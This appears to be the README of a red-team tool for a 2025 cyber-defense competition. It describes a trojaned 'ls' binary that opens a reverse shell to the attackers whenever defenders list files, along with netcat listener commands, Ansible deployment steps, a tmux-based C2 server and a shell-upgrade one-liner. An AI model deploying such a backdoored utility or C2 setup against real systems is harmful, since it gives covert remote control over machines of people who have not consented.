# CDT 2025 Red Team tool
## Bad ls
Red team tool that will give the entire 10.0.20.0/24 red team subnet a reverse shell if the red team box is listening on the correct port

Reverse shells will be initiated on every blue team execution of the "ls" command

The port number the reverse shell will connect to will be
```py
(10000,20000,30000 depending on blue team number + last octet of target ip address)
```
If the target machine belongs to a 192.168.x.x (cloud boxes in this competition), then add 500 to the port number

So, for example, we want to connect to 10.0.3.5, the port number will be `30005`

## Starting listener
Port number is subject to change
```bash
nc -nvlp 30005
```

## Building and deploying

Note: build executable on debian bookworm instance

Install libpython3.11
```bash
apt install libpython3.11
```

In the venv, install requirements
```bash
pip install -r requirements.txt
```

Build python script into linux binary
```bash
./convert_to_linux_binary.sh
```

Configure `ansible/inventory.ini` to match target(s), then deploy
```bash
ansible-playbook deploy_tools.yml
```

## Command and Control (C2)
To open a port on every recievable port for this competition, execute
```bash
python3 c2.py
```
To open a session, use 
```bash
tmux attach -t c2_t1_10002
```
Where t1 = team number (1,2,3) and 10002 represents the port. To detach from tmux session, use
```
CTRL + B, D
```

In the instance where all tmux sessions need to be killed, run
```bash
tmux kill-server
```

## Upgrading reverse shell to fully interactive tty
Execute this after recieving a netcat connection
Useful for being able to use sudo, etc. 
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

# Project structure
- `ansible/` all ansible deployment scripts, inventory, and configuration
- `dist/` where pyinstaller builds the linux binary
- `bad_ls.py` source code for bad_ls binary
- `c2.py` python c2 server that works through spawning numerous tmux sessions with netcat listeners
- `convert_to_linux_binary.sh` build script for `bad_ls.py`
- `move_to_debian.sh` script used to manually transfer binaries to target during development
- `requirements.txt` python dependencies for `bad_ls.py`

> Author: Daniel Wolosiuk

Oct 17, 2025

